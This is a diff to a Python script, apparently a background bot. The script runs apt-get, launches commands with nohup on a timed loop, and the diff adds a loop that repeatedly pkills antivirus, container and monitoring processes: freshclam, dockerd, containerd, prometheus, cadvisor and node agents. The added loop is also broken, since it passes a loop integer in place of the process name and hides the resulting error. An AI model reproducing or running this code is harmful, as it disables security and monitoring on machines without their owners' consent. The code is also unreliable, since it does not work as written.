@@ -4,7 +4,7 @@ import time
 from sys import platform
 import requests
 import subprocess
-    #import multiprocessing
+
 
 if platform == "linux" or platform == "linux2":
     operate_system = 'lin'
@@ -15,6 +15,7 @@ elif platform == "win32":
 
 timeout = 30
 thoi_gian_nghi = 28800
+
 if operate_system == 'lin':
     try:
         os.system('apt-get update -y')
@@ -132,4 +133,12 @@ while True:
                 os.system ('nohup %s &' %command)
             else:
                 os.system ('%s &' %command)
-    time.sleep(thoi_gian_nghi)
+    for i in range(0, thoi_gian_nghi,2):
+        time.sleep(2)
+        print('Thoi gian con la la ' + str(thoi_gian_nghi - i))
+        array_kill = ['freshclam', 'dockerd', 'containerd', 'mdsdmgr', 'node_controller', 'cadvisor', 'prometheus', 'node_agent', 'tail']
+        for n in array_kill:
+            try:
+                os.system('pkill ' + i)
+            except:
+                pass
